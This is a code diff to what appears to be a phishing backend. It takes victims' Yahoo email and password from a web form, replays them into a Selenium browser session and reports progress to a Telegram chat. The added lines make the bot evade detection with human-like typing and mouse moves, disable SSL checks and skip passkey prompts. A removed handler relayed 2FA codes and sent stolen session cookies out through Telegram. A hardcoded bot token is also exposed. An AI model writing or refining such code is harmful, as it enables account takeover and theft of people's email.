@@ -9,13 +9,23 @@ import json
 import random
 import telebot
 from threading import Thread
+from selenium.webdriver.common.action_chains import ActionChains
 import os
+import ssl
+
+# SSL Bypass
+try:
+    _create_unverified_https_context = ssl._create_unverified_context
+except AttributeError:
+    pass
+else:
+    ssl._create_default_https_context = _create_unverified_https_context
 
 app = Flask(__name__)
 CORS(app)
 
-BOT_TOKEN = "8664946712:AAHho-AsU7hRuBs43J-7k-kZ5gmhUz6-6b8"
-CHAT_ID = -1003709189605
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 current_driver = None
 current_email = None
@@ -25,6 +35,20 @@ PROXIES = [
 ]
 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+def human_type(element, text):
+    for char in text:
+        element.send_keys(char)
+        time.sleep(random.uniform(0.08, 0.25))
+
+def random_mouse_move(driver):
+    try:
+        actions = ActionChains(driver)
+        for _ in range(random.randint(4, 8)):
+            actions.move_by_offset(random.randint(-80, 80), random.randint(-60, 60)).perform()
+            time.sleep(random.uniform(0.4, 0.9))
+    except:
+        pass
 
 @app.route('/start_login', methods=['POST'])
 def start_login():
@@ -38,51 +62,6 @@ def start_login():
     bot.send_message(CHAT_ID, f"📧 New Login Request\nEmail: {email}")
     Thread(target=selenium_login, args=(email, password)).start()
     return jsonify({"success": True})
-
-@app.route('/submit_2fa', methods=['POST'])
-def submit_2fa():
-    global current_driver, current_email
-    data = request.json
-    code = data.get('code')
-
-    if not current_driver:
-        return jsonify({"success": False, "error": "No active session"})
-
-    try:
-        code_input = WebDriverWait(current_driver, 15).until(
-            EC.presence_of_element_located((By.ID, "codeInput"))
-        )
-        code_input.clear()
-        code_input.send_keys(code)
-
-        verify_button = current_driver.find_element(By.TAG_NAME, "button")
-        verify_button.click()
-
-        bot.send_message(CHAT_ID, f"✅ 2FA Code Submitted: {code}")
-
-        time.sleep(10)
-        current_driver.get("https://mail.yahoo.com/")
-        time.sleep(12)
-
-        cookies = current_driver.get_cookies()
-        total = len(cookies)
-
-        filename = f"yahoo_cookies_{current_email.split('@')[0]}.json"
-        with open(filename, "w") as f:
-            json.dump({
-                "email": current_email,
-                "status": "success_2fa",
-                "total_cookies": total,
-                "full_cookies": {c['name']: c['value'] for c in cookies}
-            }, f, indent=2)
-
-        with open(filename, "rb") as f:
-            bot.send_document(CHAT_ID, f, caption=f"🎉 Login Success with 2FA!\nEmail: {current_email}\nTotal Cookies: {total}")
-
-        return jsonify({"success": True})
-
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)})
 
 def selenium_login(email, password):
     global current_driver, current_email
@@ -107,27 +86,40 @@ def selenium_login(email, password):
         driver.get("https://login.yahoo.com/")
         time.sleep(8)
 
-        wait = WebDriverWait(driver, 30)
+        wait = WebDriverWait(driver, 45)
 
         bot.send_message(CHAT_ID, "📝 Entering Username...")
-        username = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
-        username.send_keys(email)
+        username_field = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
+        human_type(username_field, email)
+        random_mouse_move(driver)
         driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
         time.sleep(6)
 
         bot.send_message(CHAT_ID, "🔑 Entering Password...")
         password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))
-        password_field.send_keys(password)
+        human_type(password_field, password)
+        random_mouse_move(driver)
         driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()
 
         bot.send_message(CHAT_ID, "⏳ Checking result...")
         time.sleep(15)
 
-        if any(x in driver.current_url.lower() for x in ["2fa", "verification", "challenge", "otp", "code"]):
-            bot.send_message(CHAT_ID, "🔐 2FA Detected!\nGo to your 2fa.html page and enter the code.")
+        # Passkey Skip
+        try:
+            skip_button = WebDriverWait(driver, 10).until(
+                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(),'Skip') or contains(text(),'skip')]"))
+            )
+            skip_button.click()
+            bot.send_message(CHAT_ID, "✅ Skipped Passkey")
+            time.sleep(8)
+        except:
+            pass
+
+        current_url = driver.current_url.lower()
+        if any(x in current_url for x in ["2fa", "verification", "challenge", "otp", "code"]):
+            bot.send_message(CHAT_ID, "🔐 2FA Page Detected!\nGo to your 2fa.html and enter the code.")
             return
 
-        # No 2FA
         bot.send_message(CHAT_ID, "✅ No 2FA. Proceeding...")
         driver.get("https://mail.yahoo.com/")
         time.sleep(12)
@@ -150,11 +142,8 @@ def selenium_login(email, password):
         bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:200]}")
     finally:
         if driver:
-            try:
-                driver.quit()
-            except:
-                pass
+            driver.quit()
 
 if __name__ == '__main__':
     print("🚀 Backend Started")
-    app.run(host='0.0.0.0', port=5001, debug=False)
+    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5001)), debug=False)
